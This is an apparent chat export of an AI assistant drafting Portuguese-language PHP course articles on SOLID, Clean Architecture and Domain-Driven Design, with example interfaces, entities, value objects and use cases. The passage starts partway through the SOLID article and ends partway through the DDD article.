declare(strict_types=1);

// ── PROBLEMA: interface gorda ─────────────────────────────────────────
interface Trabalhador
{
    public function trabalhar(): void;
    public function comer(): void;
    public function dormir(): void;
    public function receberSalario(): void;
}

// Robô não come nem dorme — mas é forçado a implementar
class RoboTrabalhador implements Trabalhador
{
    public function trabalhar(): void       { echo "Trabalhando...\n"; }
    public function comer(): void           { throw new \LogicException('Robôs não comem!'); }
    public function dormir(): void          { throw new \LogicException('Robôs não dormem!'); }
    public function receberSalario(): void  { /* Robô não recebe */ }
}

// ── SOLUÇÃO: interfaces coesas e focadas ──────────────────────────────
interface Trabalhavel
{
    public function trabalhar(): void;
}

interface Alimentavel
{
    public function comer(): void;
    public function dormir(): void;
}

interface Remuneravel
{
    public function receberSalario(float $valor): void;
}

// Funcionário humano implementa tudo
class FuncionarioHumano implements Trabalhavel, Alimentavel, Remuneravel
{
    public function trabalhar(): void              { echo "Trabalhando...\n"; }
    public function comer(): void                  { echo "Almoçando...\n"; }
    public function dormir(): void                 { echo "Descansando...\n"; }
    public function receberSalario(float $v): void { echo "Recebeu R$ {$v}\n"; }
}

// Robô só implementa o que faz sentido
class RoboTrabalhador2 implements Trabalhavel
{
    public function trabalhar(): void { echo "Processando...\n"; }
}

// Código que depende apenas do que precisa
function executarTurno(Trabalhavel $trabalhador): void
{
    $trabalhador->trabalhar();
    // Não sabe e não precisa saber se é humano ou robô
}
```

---

## D — Dependency Inversion Principle

Módulos de alto nível não devem depender de módulos de baixo nível. Ambos devem depender de abstrações. A abstração não deve depender de detalhes — os detalhes devem depender da abstração.

```php
<?php
declare(strict_types=1);

// ── PROBLEMA: acoplamento direto à implementação ──────────────────────
class ProcessadorDePedido
{
    // Acoplado ao MySQL — trocar de banco = modificar esta classe
    private \PDO $pdo;

    public function __construct()
    {
        // new dentro do construtor = dependência hardcoded
        $this->pdo = new \PDO('mysql:host=localhost;dbname=loja', 'root', '');
    }

    public function processar(int $pedidoId): void
    {
        $stmt = $this->pdo->prepare('UPDATE pedidos SET status = ? WHERE id = ?');
        $stmt->execute(['processado', $pedidoId]);
    }
}

// ── SOLUÇÃO: depender de abstrações, não de implementações ────────────
interface PedidoRepositorioInterface
{
    public function atualizarStatus(int $pedidoId, string $status): void;
    public function buscarPorId(int $id): ?array;
}

interface NotificadorInterface
{
    public function notificar(string $destinatario, string $mensagem): void;
}

// Módulo de alto nível depende apenas de interfaces
class ProcessadorDePedidoDIP
{
    public function __construct(
        private readonly PedidoRepositorioInterface $repositorio,
        private readonly NotificadorInterface       $notificador,
    ) {}

    public function processar(int $pedidoId): void
    {
        $pedido = this->repositorio->buscarPorId($pedidoId);

        if ($pedido === null) {
            throw new \RuntimeException("Pedido #{$pedidoId} não encontrado.");
        }

        $this->repositorio->atualizarStatus($pedidoId, 'processado');
        $this->notificador->notificar($pedido['email_cliente'], "Pedido #{$pedidoId} processado.");
    }
}

// Implementações concretas — detalhes que dependem da abstração
class PedidoRepositorioPDO implements PedidoRepositorioInterface
{
    public function __construct(private readonly \PDO $pdo) {}

    public function atualizarStatus(int $id, string $status): void
    {
        $this->pdo->prepare('UPDATE pedidos SET status = ? WHERE id = ?')
                  ->execute([$status, $id]);
    }

    public function buscarPorId(int $id): ?array
    {
        $stmt = $this->pdo->prepare('SELECT * FROM pedidos WHERE id = ?');
        $stmt->execute([$id]);
        return $stmt->fetch(\PDO::FETCH_ASSOC) ?: null;
    }
}

class NotificadorEmail implements NotificadorInterface
{
    public function notificar(string $destinatario, string $mensagem): void
    {
        mail($destinatario, 'Atualização do pedido', $mensagem);
    }
}

// Fácil de testar — basta injetar mocks
class NotificadorFake implements NotificadorInterface
{
    public array $mensagensEnviadas = [];
    public function notificar(string $d, string $m): void
    {
        $this->mensagensEnviadas[] = ['destinatario' => $d, 'mensagem' => $m];
    }
}
```

---

## Resumo do artigo

| Princípio | Problema resolvido | Sinal de violação |
|---|---|---|
| SRP | Classe com múltiplos motivos para mudar | Método com mais de uma responsabilidade |
| OCP | Modificar código existente para novos casos | `if/elseif` crescendo a cada novo tipo |
| LSP | Subclasse quebra expectativas do contrato | Método herdado lança `LogicException` |
| ISP | Interface forçando métodos não usados | Implementações com `throw new LogicException` |
| DIP | Acoplamento a implementações concretas | `new` dentro de construtores, classes concretas como parâmetro |

---

## Exercício da semana

1. Refatore o `ProdutoController` do Artigo 23 para aplicar SRP: extraia a validação para `ProdutoValidator`, a leitura do corpo para `RequestReader`, e a serialização para `ProdutoSerializer`. O controller deve apenas orquestrar.

2. Aplique OCP ao sistema de notificações: crie uma interface `CanalDeNotificacao` com método `enviar(string $destinatario, string $mensagem): void` e implemente `NotificacaoEmail`, `NotificacaoSMS` e `NotificacaoSlack`. O `NotificacaoService` deve aceitar um array de canais.

3. Identifique a violação de LSP no seguinte cenário: `ColecaoOrdenada extends Colecao` onde `Colecao::adicionar()` aceita qualquer posição e `ColecaoOrdenada::adicionar()` ignora a posição e mantém ordenação. Proponha uma solução com interfaces separadas.

4. Refatore o `MigrationRunner` aplicando DIP: crie uma interface `LoggerInterface` com método `log(string $mensagem): void` e injete-a no runner em vez de usar `echo` diretamente. Implemente `LoggerConsole` e `LoggerArray` (para testes).

5. **Desafio:** escreva testes unitários que **provam** os princípios SOLID no seu código. Por exemplo: para DIP, o teste injeta um mock e verifica que `ProcessadorDePedido` não instancia nada diretamente. Para OCP, adicione uma nova `RegraDeDesconto` e verifique que os testes existentes continuam passando.

---

## Referências

- Uncle Bob — The SOLID Principles: https://blog.cleancoder.com/uncle-bob/2020/10/18/Solid-Relevance.html
- PHP The Right Way — Design Patterns: https://phptherightway.com/#design_patterns
- Refactoring Guru — SOLID: https://refactoring.guru/pt-br/design-patterns
- PHP Manual — Interfaces: https://www.php.net/manual/pt_BR/language.oop5.interfaces.php

---

Texto do Artigo 26 completo. Gerando HTML.

---

# claude response

# Artigo 27 — Clean Architecture com PHP

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 27 · Módulo 6: Qualidade de Código

---

## Introdução

Clean Architecture, formulada por Robert C. Martin, organiza o código em camadas concêntricas onde as dependências sempre apontam para dentro — do framework para o domínio, nunca o contrário. O resultado é um sistema onde a lógica de negócio não sabe que existe um banco de dados, um framework HTTP ou qualquer infraestrutura específica.

A regra central é a **Regra de Dependência**: código nas camadas internas não pode conhecer nada das camadas externas. O domínio não importa classes do Laravel. Os use cases não importam PDO. As interfaces de repositório vivem no domínio — as implementações concretas vivem na infraestrutura.

Neste artigo construímos um módulo completo de pedidos seguindo Clean Architecture: Entidades, Use Cases, Interfaces de Repositório, Controllers e Infraestrutura — cada camada no seu lugar.

---

## As quatro camadas

```
┌─────────────────────────────────────────────────────────┐
│  Frameworks & Drivers  (Laravel, Slim, PDO, Redis)      │  ← Camada mais externa
├─────────────────────────────────────────────────────────┤
│  Interface Adapters    (Controllers, Presenters, Gateways)│
├─────────────────────────────────────────────────────────┤
│  Application           (Use Cases / Interactors)        │
├─────────────────────────────────────────────────────────┤
│  Domain                (Entities, Value Objects, Rules) │  ← Camada mais interna
└─────────────────────────────────────────────────────────┘
          Dependências apontam SEMPRE para dentro →
```

```
src/
├── Domain/
│   ├── Pedido/
│   │   ├── Pedido.php              # Entidade
│   │   ├── ItemDePedido.php        # Value Object
│   │   ├── StatusDoPedido.php      # Enum
│   │   └── PedidoRepositorioInterface.php
│   └── Produto/
│       ├── Produto.php
│       └── ProdutoRepositorioInterface.php
├── Application/
│   └── Pedido/
│       ├── CriarPedido/
│       │   ├── CriarPedidoUseCase.php
│       │   ├── CriarPedidoInput.php
│       │   └── CriarPedidoOutput.php
│       └── CancelarPedido/
│           ├── CancelarPedidoUseCase.php
│           └── CancelarPedidoInput.php
├── Infrastructure/
│   └── Persistence/
│       ├── PedidoRepositorioPDO.php
│       └── ProdutoRepositorioPDO.php
└── Presentation/
    └── Http/
        └── PedidoController.php
```

---

## Camada de Domínio — Entidades e Value Objects

```php
<?php
declare(strict_types=1);

namespace App\Domain\Pedido;

// ── Value Object — imutável, sem identidade ──────────────────────────
final class ItemDePedido
{
    public function __construct(
        public readonly int   $produtoId,
        public readonly int   $quantidade,
        public readonly float $precoUnitario,
    ) {
        if ($quantidade <= 0) {
            throw new \DomainException("Quantidade deve ser positiva, recebido: {$quantidade}");
        }
        if ($precoUnitario < 0) {
            throw new \DomainException("Preço não pode ser negativo.");
        }
    }

    public function subtotal(): float
    {
        return round($this->precoUnitario * $this->quantidade, 2);
    }
}

// ── Enum de status — estados válidos do pedido ────────────────────────
enum StatusDoPedido: string
{
    case Pendente    = 'pendente';
    case Confirmado  = 'confirmado';
    case EmPreparo   = 'em_preparo';
    case Enviado     = 'enviado';
    case Entregue    = 'entregue';
    case Cancelado   = 'cancelado';

    public function podeTransicionarPara(self $destino): bool
    {
        return match($this) {
            self::Pendente   => in_array($destino, [self::Confirmado, self::Cancelado]),
            self::Confirmado => in_array($destino, [self::EmPreparo,  self::Cancelado]),
            self::EmPreparo  => in_array($destino, [self::Enviado,    self::Cancelado]),
            self::Enviado    => $destino === self::Entregue,
            default          => false,
        };
    }
}

// ── Entidade — tem identidade, contém regras de negócio ──────────────
class Pedido
{
    private array  $itens     = [];
    private string $numero;

    private function __construct(
        public readonly int    $id,
        public readonly int    $clienteId,
        private StatusDoPedido $status,
        private \DateTimeImmutable $criadoEm,
    ) {
        $this->numero = sprintf('PED-%06d', $id);
    }

    public static function criar(int $clienteId): static
    {
        return new static(
            id:        0,
            clienteId: $clienteId,
            status:    StatusDoPedido::Pendente,
            criadoEm:  new \DateTimeImmutable(),
        );
    }

    public static function reconstituir(
        int                $id,
        int                $clienteId,
        StatusDoPedido     $status,
        \DateTimeImmutable $criadoEm,
        array              $itens = [],
    ): static {
        $pedido         = new static($id, $clienteId, $status, $criadoEm);
        $pedido->itens  = $itens;
        return $pedido;
    }

    public function adicionarItem(ItemDePedido $item): void
    {
        if ($this->status !== StatusDoPedido::Pendente) {
            throw new \DomainException(
                "Não é possível adicionar itens a um pedido com status '{$this->status->value}'."
            );
        }
        $this->itens[] = $item;
    }

    public function confirmar(): void
    {
        if (empty($this->itens)) {
            throw new \DomainException('Não é possível confirmar um pedido sem itens.');
        }
        $this->transicionarPara(StatusDoPedido::Confirmado);
    }

    public function cancelar(): void
    {
        $this->transicionarPara(StatusDoPedido::Cancelado);
    }

    private function transicionarPara(StatusDoPedido $destino): void
    {
        if (!$this->status->podeTransicionarPara($destino)) {
            throw new \DomainException(
                "Transição inválida: '{$this->status->value}' → '{$destino->value}'"
            );
        }
        $this->status = $destino;
    }

    public function total(): float
    {
        return array_reduce(
            $this->itens,
            fn(float $acc, ItemDePedido $item) => $acc + $item->subtotal(),
            0.0
        );
    }

    public function status(): StatusDoPedido             { return $this->status; }
    public function numero(): string                     { return $this->numero; }
    public function itens(): array                       { return $this->itens; }
    public function criadoEm(): \DateTimeImmutable       { return $this->criadoEm; }
}
```

---

## Interface de Repositório — no Domínio, não na Infraestrutura

```php
<?php
declare(strict_types=1);

namespace App\Domain\Pedido;

// A interface vive no Domínio — o Domínio define o CONTRATO
// A implementação PDO vive na Infraestrutura — um detalhe externo
interface PedidoRepositorioInterface
{
    public function salvar(Pedido $pedido): Pedido;
    public function buscarPorId(int $id): ?Pedido;
    public function buscarPorCliente(int $clienteId, int $limite = 20, int $offset = 0): array;
    public function proximo(): int; // próximo ID disponível (ou use autoincrement)
}
```

---

## Camada de Aplicação — Use Cases

```php
<?php
declare(strict_types=1);

namespace App\Application\Pedido\CriarPedido;

// ── DTOs de entrada e saída — sem lógica de negócio ──────────────────
final class CriarPedidoInput
{
    public function __construct(
        public readonly int   $clienteId,
        /** @var array<array{produto_id: int, quantidade: int}> */
        public readonly array $itens,
    ) {}
}

final class ItemDePedidoOutput
{
    public function __construct(
        public readonly int    $produtoId,
        public readonly string $nomeProduto,
        public readonly int    $quantidade,
        public readonly float  $precoUnitario,
        public readonly float  $subtotal,
    ) {}
}

final class CriarPedidoOutput
{
    public function __construct(
        public readonly int    $pedidoId,
        public readonly string $numero,
        public readonly string $status,
        public readonly float  $total,
        /** @var ItemDePedidoOutput[] */
        public readonly array  $itens,
        public readonly string $criadoEm,
    ) {}
}
```

```php
<?php
declare(strict_types=1);

namespace App\Application\Pedido\CriarPedido;

use App\Domain\Pedido\{Pedido, ItemDePedido, PedidoRepositorioInterface};
use App\Domain\Produto\ProdutoRepositorioInterface;

class CriarPedidoUseCase
{
    public function __construct(
        private readonly PedidoRepositorioInterface  $pedidos,
        private readonly ProdutoRepositorioInterface $produtos,
    ) {}

    public function executar(CriarPedidoInput $input): CriarPedidoOutput
    {
        if (empty($input->itens)) {
            throw new \DomainException('Um pedido deve ter pelo menos um item.');
        }

        $pedido      = Pedido::criar($input->clienteId);
        $itensOutput = [];

        foreach ($input->itens as $dadosItem) {
            $produto = $this->produtos->buscarPorId($dadosItem['produto_id']);

            if ($produto === null) {
                throw new \DomainException(
                    "Produto #{$dadosItem['produto_id']} não encontrado."
                );
            }

            if (!$produto->temEstoque($dadosItem['quantidade'])) {
                throw new \DomainException(
                    "Estoque insuficiente para '{$produto->nome}'. "
                    . "Disponível: {$produto->estoque}, solicitado: {$dadosItem['quantidade']}"
                );
            }

            $item = new ItemDePedido(
                produtoId:      $produto->id,
                quantidade:     $dadosItem['quantidade'],
                precoUnitario:  $produto->preco,
            );

            $pedido->adicionarItem($item);

            $itensOutput[] = new ItemDePedidoOutput(
                produtoId:      $produto->id,
                nomeProduto:    $produto->nome,
                quantidade:     $dadosItem['quantidade'],
                precoUnitario:  $produto->preco,
                subtotal:       $item->subtotal(),
            );
        }

        $pedido->confirmar();
        $salvo = $this->pedidos->salvar($pedido);

        return new CriarPedidoOutput(
            pedidoId: $salvo->id,
            numero:   $salvo->numero(),
            status:   $salvo->status()->value,
            total:    $salvo->total(),
            itens:    $itensOutput,
            criadoEm: $salvo->criadoEm()->format('Y-m-d H:i:s'),
        );
    }
}
```

```php
<?php
declare(strict_types=1);

namespace App\Application\Pedido\CancelarPedido;

use App\Domain\Pedido\PedidoRepositorioInterface;

final class CancelarPedidoInput
{
    public function __construct(
        public readonly int $pedidoId,
        public readonly int $clienteId, // para verificar que é o dono
    ) {}
}

class CancelarPedidoUseCase
{
    public function __construct(
        private readonly PedidoRepositorioInterface $pedidos,
    ) {}

    public function executar(CancelarPedidoInput $input): void
    {
        $pedido = $this->pedidos->buscarPorId($input->pedidoId);

        if ($pedido === null) {
            throw new \DomainException("Pedido #{$input->pedidoId} não encontrado.");
        }

        if ($pedido->clienteId !== $input->clienteId) {
            throw new \DomainException('Acesso negado: este pedido pertence a outro cliente.');
        }

        $pedido->cancelar(); // a entidade valida a transição de estado

        $this->pedidos->salvar($pedido);
    }
}
```

---

## Camada de Apresentação — Controller

```php
<?php
declare(strict_types=1);

namespace App\Presentation\Http;

use App\Application\Pedido\CriarPedido\{CriarPedidoUseCase, CriarPedidoInput};
use App\Application\Pedido\CancelarPedido\{CancelarPedidoUseCase, CancelarPedidoInput};

class PedidoController
{
    public function __construct(
        private readonly CriarPedidoUseCase    $criarPedido,
        private readonly CancelarPedidoUseCase $cancelarPedido,
    ) {}

    // POST /api/pedidos
    public function criar(array $params): void
    {
        $usuario = $_REQUEST['usuario_autenticado'] ?? null;
        if ($usuario === null) Resposta::naoAutorizado();

        $corpo = $this->lerCorpo();

        if (empty($corpo['itens']) || !is_array($corpo['itens'])) {
            Resposta::badRequest('O campo "itens" é obrigatório e deve ser um array.');
        }

        try {
            $output = $this->criarPedido->executar(new CriarPedidoInput(
                clienteId: $usuario['id'],
                itens:     $corpo['itens'],
            ));

            Resposta::criado([
                'pedido_id' => $output->pedidoId,
                'numero'    => $output->numero,
                'status'    => $output->status,
                'total'     => $output->total,
                'itens'     => array_map(fn($i) => [
                    'produto_id'     => $i->produtoId,
                    'nome_produto'   => $i->nomeProduto,
                    'quantidade'     => $i->quantidade,
                    'preco_unitario' => $i->precoUnitario,
                    'subtotal'       => $i->subtotal,
                ], $output->itens),
                'criado_em' => $output->criadoEm,
            ]);

        } catch (\DomainException $e) {
            // Erros de domínio são erros do cliente — 422 Unprocessable Entity
            Resposta::erro(422, $e->getMessage());
        }
    }

    // POST /api/pedidos/{id}/cancelar
    public function cancelar(array $params): void
    {
        $usuario = $_REQUEST['usuario_autenticado'] ?? null;
        if ($usuario === null) Resposta::naoAutorizado();

        try {
            $this->cancelarPedido->executar(new CancelarPedidoInput(
                pedidoId:  $params['id'],
                clienteId: $usuario['id'],
            ));
            Resposta::semConteudo();
        } catch (\DomainException $e) {
            Resposta::erro(422, $e->getMessage());
        }
    }

    private function lerCorpo(): array
    {
        $dados = json_decode(file_get_contents('php://input') ?: '', associative: true);
        if (json_last_error() !== JSON_ERROR_NONE) Resposta::badRequest('JSON inválido.');
        return $dados ?? [];
    }
}
```

---

## Resumo do artigo

| Camada | Conteúdo | Depende de |
|---|---|---|
| Domain | Entidades, Value Objects, Enums, Interfaces de Repo | Nada externo |
| Application | Use Cases, DTOs (Input/Output) | Domain |
| Infrastructure | Repositórios PDO, cache, email | Domain (interfaces) |
| Presentation | Controllers, Middlewares | Application |

---

## Exercício da semana

1. Implemente o `PedidoRepositorioPDO` na camada de Infrastructure: método `salvar()` deve inserir ou atualizar dependendo se `$pedido->id === 0`. Método `buscarPorId()` deve reconstituir a entidade via `Pedido::reconstituir()`.

2. Crie o Use Case `AtualizarStatusDoPedido` com `AtualizarStatusInput(pedidoId, novoStatus, usuarioId)`. Valide que o usuário tem perfil `admin` ou é o dono do pedido. Use o método `transicionarPara()` da entidade.

3. Escreva testes unitários para `CriarPedidoUseCase`: mock de `PedidoRepositorioInterface` e `ProdutoRepositorioInterface`. Teste: produto não encontrado, estoque insuficiente, pedido criado com sucesso.

4. Adicione um `EventosDeDominio` à entidade `Pedido`: ao confirmar, registre `PedidoConfirmado(pedidoId, clienteId, total)`. O Use Case coleta os eventos após `salvar()` e os despacha para um `EventDispatcher`.

5. **Desafio:** implemente um segundo adaptador de repositório — `PedidoRepositorioEmMemoria` que armazena os pedidos em um array PHP. Use-o nos testes de integração do Use Case para testar o fluxo completo sem banco de dados.

---

## Referências

- Clean Architecture — Robert C. Martin (livro): https://www.oreilly.com/library/view/clean-architecture-a/9780134494272/
- The Clean Architecture — artigo original: https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html
- PHP The Right Way: https://phptherightway.com
- Herberto Graça — DDD, Hexagonal, Onion, Clean Architecture: https://herbertograca.com/2017/11/16/explicit-architecture-01-ddd-hexagonal-onion-clean-cqrs-how-i-put-it-all-together/

---

Texto do Artigo 27 completo. Gerando HTML.

Artigos 25, 26 e 27 entregues. Progresso: **27/52 artigos completos** — metade do caminho!

**Módulo 6 (Qualidade de Código)** está com 3 artigos prontos:
- 25 — Testes com PHPUnit
- 26 — SOLID na Prática
- 27 — Clean Architecture

Próximo: **Artigo 28 — Domain-Driven Design**, que aprofunda o que foi introduzido no 27 — Aggregates, Value Objects com identidade, Domain Events e o padrão Repository sob a ótica do DDD. Continuo?

---

# you asked

message time: 2026-03-09 22:56:13

Continue

---

# claude response

# Artigo 28 — Domain-Driven Design

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 28 · Módulo 6: Qualidade de Código

---

## Introdução

Domain-Driven Design (DDD) é uma abordagem para desenvolver software complexo colocando o modelo de domínio no centro de todas as decisões. Criado por Eric Evans no livro seminal de 2003, DDD oferece um vocabulário preciso — Aggregates, Value Objects, Domain Events, Repositories — para modelar problemas do mundo real em código.

O artigo anterior introduziu Clean Architecture com uma entidade `Pedido`. Neste artigo aprofundamos os blocos de construção do DDD: Value Objects com igualdade por valor, Aggregates com invariantes protegidas, Domain Events para comunicação entre contextos, e o padrão Repository como coleção em memória.

---

## Value Objects — identidade por valor

Value Objects não têm identidade própria — dois Value Objects com os mesmos atributos são iguais. São imutáveis: qualquer "modificação" retorna uma nova instância.

```php
<?php
declare(strict_types=1);

namespace App\Domain\Shared;

// ── Email — Value Object ──────────────────────────────────────────────
final class Email
{
    private readonly string $valor;

    public function __construct(string $email)
    {
        $normalizado = strtolower(trim($email));

        if (!filter_var($normalizado, FILTER_VALIDATE_EMAIL)) {
            throw new \DomainException("Email inválido: '{$email}'");
        }

        $this->valor = $normalizado;
    }

    public function valor(): string { return $this->valor; }

    // Igualdade por valor — dois Emails com mesmo endereço são iguais
    public function equals(self $outro): bool
    {
        return $this->valor === $outro->valor;
    }

    public function __toString(): string { return $this->valor; }
}

// ── Dinheiro — Value Object com operações aritméticas ────────────────
final class Dinheiro
{
    public function __construct(
        private readonly int    $centavos, // armazena em centavos para evitar float imprecision
        private readonly string $moeda = 'BRL',
    ) {
        if ($centavos < 0) {
            throw new \DomainException("Valor monetário não pode ser negativo.");
        }
    }

    public static function de(float $reais, string $moeda = 'BRL'): self
    {
        return new self((int) round($reais * 100), $moeda);
    }

    public function somar(self $outro): self
    {
        $this->assertMesmaMoeda($outro);
        return new self($this->centavos + $outro->centavos, $this->moeda);
    }

    public function subtrair(self $outro): self
    {
        $this->assertMesmaMoeda($outro);
        if ($outro->centavos > $this->centavos) {
            throw new \DomainException("Subtração resultaria em valor negativo.");
        }
        return new self($this->centavos - $outro->centavos, $this->moeda);
    }

    public function multiplicar(int $fator): self
    {
        return new self($this->centavos * $fator, $this->moeda);
    }

    public function aplicarDesconto(float $percentual): self
    {
        if ($percentual < 0 || $percentual > 100) {
            throw new \DomainException("Percentual inválido: {$percentual}");
        }
        $desconto = (int) round($this->centavos * $percentual / 100);
        return new self($this->centavos - $desconto, $this->moeda);
    }

    public function maiorQue(self $outro): bool
    {
        $this->assertMesmaMoeda($outro);
        return $this->centavos > $outro->centavos;
    }

    public function equals(self $outro): bool
    {
        return $this->centavos === $outro->centavos && $this->moeda === $outro->moeda;
    }

    public function reais(): float  { return $this->centavos / 100; }
    public function centavos(): int { return $this->centavos; }
    public function moeda(): string { return $this->moeda; }

    public function formatar(): string
    {
        return 'R$ ' . number_format($this->reais(), 2, ',', '.');
    }

    private function assertMesmaMoeda(self $outro): void
    {
        if ($this->moeda !== $outro->moeda) {
            throw new \DomainException(
                "Operação entre moedas diferentes: {$this->moeda} e {$outro->moeda}"
            );
        }
    }
}

// ── CPF — Value Object ────────────────────────────────────────────────
final class Cpf
{
    private readonly string $numero;

    public function __construct(string $cpf)
    {
        $limpo = preg_replace('/\D/', '', $cpf);

        if (!$this->validar($limpo)) {
            throw new \DomainException("CPF inválido: '{$cpf}'");
        }

        $this->numero = $limpo;
    }

    public function numero(): string { return $this->numero; }

    public function formatado(): string
    {
        return substr($this->numero, 0, 3) . '.'
             . substr($this->numero, 3, 3) . '.'
             . substr($this->numero, 6, 3) . '-'
             . substr($this->numero, 9, 2);
    }

    public function equals(self $outro): bool
    {
        return $this->numero === $outro->numero;
    }

    private function validar(string $cpf): bool
    {
        if (strlen($cpf) !== 11 || preg_match('/^(\d)\1{10}$/', $cpf)) return false;

        for ($t = 9; $t < 11; $t++) {
            $soma = 0;
            for ($c = 0; $c < $t; $c++) {
                $soma += (int) $cpf[$c] * (($t + 1) - $c);
            }
            $digito = ((10 * $soma) % 11) % 10;
            if ((int) $cpf[$t] !== $digito) return false;
        }
        return true;
    }
}
```

---

## Aggregates — consistência garantida

Um Aggregate é um cluster de objetos de domínio tratado como uma unidade para fins de persistência. O Aggregate Root é o único ponto de entrada — nada acessa os objetos internos diretamente.

```php
<?php
declare(strict_types=1);

namespace App\Domain\Carrinho;

use App\Domain\Shared\{Dinheiro};

// ── Entidade interna do Aggregate — não exposta externamente ─────────
class ItemDoCarrinho
{
    public function __construct(
        private readonly int     $produtoId,
        private readonly string  $nomeProduto,
        private readonly Dinheiro $precoUnitario,
        private int              $quantidade,
    ) {}

    public function aumentarQuantidade(int $incremento): void
    {
        if ($incremento <= 0) {
            throw new \DomainException("Incremento deve ser positivo.");
        }
        $this->quantidade += $incremento;
    }

    public function definirQuantidade(int $quantidade): void
    {
        if ($quantidade <= 0) {
            throw new \DomainException("Quantidade deve ser positiva.");
        }
        $this->quantidade = $quantidade;
    }

    public function subtotal(): Dinheiro
    {
        return $this->precoUnitario->multiplicar($this->quantidade);
    }

    public function produtoId(): int      { return $this->produtoId; }
    public function nomeProduto(): string { return $this->nomeProduto; }
    public function quantidade(): int     { return $this->quantidade; }
    public function precoUnitario(): Dinheiro { return $this->precoUnitario; }
}

// ── Carrinho — Aggregate Root ─────────────────────────────────────────
class Carrinho
{
    /** @var ItemDoCarrinho[] */
    private array $itens = [];

    /** @var object[] Domain Events coletados */
    private array $eventos = [];

    private const LIMITE_ITENS = 50;

    public function __construct(
        public readonly string $id,        // UUID do carrinho
        public readonly int    $clienteId,
        private \DateTimeImmutable $atualizadoEm,
    ) {}

    public function adicionarItem(
        int      $produtoId,
        string   $nomeProduto,
        Dinheiro $preco,
        int      $quantidade,
    ): void {
        if ($quantidade <= 0) {
            throw new \DomainException("Quantidade deve ser positiva.");
        }

        // Regra: se o produto já está no carrinho, incrementa a quantidade
        foreach ($this->itens as $item) {
            if ($item->produtoId() === $produtoId) {
                $item->aumentarQuantidade($quantidade);
                $this->tocarTimestamp();
                return;
            }
        }

        // Regra: limite de itens distintos
        if (count($this->itens) >= self::LIMITE_ITENS) {
            throw new \DomainException(
                "O carrinho não pode ter mais de " . self::LIMITE_ITENS . " itens diferentes."
            );
        }

        $this->itens[] = new ItemDoCarrinho($produtoId, $nomeProduto, $preco, $quantidade);
        $this->tocarTimestamp();

        // Registra evento de domínio
        $this->eventos[] = new ItemAdicionadoAoCarrinho(
            carrinhoId: $this->id,
            produtoId:  $produtoId,
            quantidade: $quantidade,
        );
    }

    public function removerItem(int $produtoId): void
    {
        $antes = count($this->itens);
        $this->itens = array_values(
            array_filter($this->itens, fn($i) => $i->produtoId() !== $produtoId)
        );

        if (count($this->itens) === $antes) {
            throw new \DomainException("Produto #{$produtoId} não está no carrinho.");
        }
        $this->tocarTimestamp();
    }

    public function atualizarQuantidade(int $produtoId, int $quantidade): void
    {
        foreach ($this->itens as $item) {
            if ($item->produtoId() === $produtoId) {
                $item->definirQuantidade($quantidade);
                $this->tocarTimestamp();
                return;
            }
        }
        throw new \DomainException("Produto #{$produtoId} não está no carrinho.");
    }

    public function limpar(): void
    {
        $this->itens = [];
        $this->tocarTimestamp();
    }

    public function total(): Dinheiro
    {
        return array_reduce(
            $this->itens,
            fn(Dinheiro $acc, ItemDoCarrinho $i) => $acc->somar($i->subtotal()),
            Dinheiro::de(0),
        );
    }

    public function estaVazio(): bool { return empty($this->itens); }

    /** @return ItemDoCarrinho[] */
    public function itens(): array { return $this->itens; }

    public function atualizadoEm(): \DateTimeImmutable { return $this->atualizadoEm; }

    /** Retorna e limpa os eventos pendentes (padrão collect-and-clear) */
    public function coletarEventos(): array
    {
        $eventos      = $this->eventos;
        $this->eventos = [];
        return $eventos;
    }

    private function tocarTimestamp(): void
    {
        $this->atualizadoEm = new \DateTimeImmutable();
    }
}
```

---

## Domain Events

Domain Events representam algo significativo que aconteceu no domínio. São objetos imutáveis que descrevem o fato no passado — nomeados no passado (`PedidoConfirmado`, `ItemAdicionado`).

```php
<?php
declare(strict_types=1);

namespace App\Domain\Carrinho;

// ── Evento base — imutável, timestamp automático ──────────────────────
abstract class EventoDeDominio
{
    public readonly \DateTimeImmutable $ocorridoEm;
    public readonly string             $eventoId;

    public function __construct()
    {
        $this->ocorridoEm = new \DateTimeImmutable();
        $this->eventoId   = bin2hex(random_bytes(16));
    }
}

// ── Eventos concretos ─────────────────────────────────────────────────
final class ItemAdicionadoAoCarrinho extends EventoDeDominio
{
    public function __construct(
        public readonly string $carrinhoId,
        public readonly int    $produtoId,
        public readonly int    $quantidade,
    ) {
        parent::__construct();
    }
}

final class CarrinhoFinalizado extends EventoDeDominio
{
    public function __construct(
        public readonly string $carrinhoId,
        public readonly int    $clienteId,
        public readonly int    $totalCentavos,
    ) {
        parent::__construct();
    }
}

// ── Dispatcher — publica eventos para os handlers ────────────────────
interface EventoDispatcherInterface
{
    public function despachar(EventoDeDominio ...$eventos): void;
}

class EventoDispatcher implements EventoDispatcherInterface
{
    /** @var array<string, callable[]> */
    private array $handlers = [];

    public function escutar(string $classeEvento, callable $handler): void
    {
        $this->handlers[$classeEvento][] = $handler;
    }

    public function despachar(EventoDeDominio ...$eventos): void
    {
        foreach ($eventos as $evento) {
            $classe = get_class($evento);
            foreach ($this->handlers[$classe] ?? [] as $handler) {
                $handler($evento);
            }
        }
    }
}

// ── Uso: registrar handlers e despachar após persistência ────────────
$dispatcher = new EventoDispatcher();

$dispatcher->escutar(
    ItemAdicionadoAoCarrinho::class,
    function (ItemAdicionadoAoCarrinho $evento): void {
        // Atualiza cache de contagem de carrinhos com o produto
        // apc_inc("produto:{$evento->produtoId}:carrinhos");
        error_log("Item {$evento->produtoId} adicionado ao carrinho {$evento->carrinhoId}");
    }
);

$dispatcher->escutar(
    CarrinhoFinalizado::class,
    function (CarrinhoFinalizado $evento): void {
        // Dispara analytics, notificações, etc.
        error_log("Carrinho {$evento->carrinhoId} finalizado: R$ " . ($evento->totalCentavos / 100));
    }
);
```

---

## Repository como coleção em memória

No DDD, um Repository simula uma coleção em memória. Você `adiciona`, `busca` e `remove` como se fosse um array — os detalhes de persistência são irrelevantes para o domínio.

```php
<?php
declare(strict_types=1);

namespace App\Domain\Carrinho;

// Interface no domínio — parece uma coleção, não um DAO
interface CarrinhoRepositorioInterface
{
    public function adicionar(Carrinho $carrinho): void;
    public function buscarPorId(string $id): ?Carrinho;
    public function buscarPorCliente(int $clienteId): ?Carrinho;
    public function remover(string $id): void;
}

// ── Implementação em Redis (infraestrutura) ───────────────────────────
